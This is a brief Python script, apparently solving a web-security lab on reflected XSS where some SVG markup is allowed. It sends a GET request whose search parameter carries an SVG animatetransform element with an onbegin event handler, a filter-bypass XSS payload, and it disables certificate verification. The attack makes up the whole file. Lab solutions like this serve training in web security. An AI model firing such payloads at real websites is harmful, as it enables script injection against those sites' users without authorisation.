import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Reflected XSS with some SVG markup allowed"

def run(url, payload, proxies=None):
    path = "?search="
    payload = "<svg><animatetransform onbegin=alert(1) attributeName=transform>"
    try:
        r = requests.get(url.rstrip('/') + path + payload, verify=False, proxies=proxies)
        res = r.text
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False